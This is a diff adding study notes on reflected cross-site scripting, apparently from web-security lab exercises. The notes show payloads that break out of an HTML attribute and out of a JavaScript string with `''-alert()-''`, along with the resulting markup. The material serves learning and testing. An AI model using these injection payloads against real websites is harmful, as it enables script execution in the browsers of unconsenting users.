@@ -1,5 +1,60 @@
 # reflected examples
 
+## break out converted angle brackets
+
+in case of input convert the
+
+- `<` -> `&lt;`
+- `>` -> `&gt;`
+
+might need to break out from the input like:
+
+`/?search="onmouseover="alert()`
+
+wht really looks like ->
+
+`/?search="onmouseover%3D"alert%28%29`
+
+that will add the `onmouseover="alert()"` to the input ->
+
+`<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert()">`
+
+## break out javascript encodeURIComponent function
+
+in case of:
+
+```
+<script>
+var searchTerms = 'duck';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+<img src="/resources/images/tracker.gif?searchTerms=duck">
+```
+
+can break out from search terms like
+
+`'' - NaN - ''` -> NaN
+
+it try to negate the `NaN` from `''` -> can replace NaN with a function like `alert()`
+
+`'' - alert() - ''`
+
+so instead of duck it will look like
+
+`var searchTerms = ''-alert()-'';`
+
+that results
+
+```
+<script>
+var searchTerms = ''-alert()-'';
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+<img src="/resources/images/tracker.gif?searchTerms=NaN">
+```
+
+so the two `''` want to make a mathematical operation with `alert()`, but `alert()` needs to be executed first
+
 ## search input blocks tags/attributes/interaction
 
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
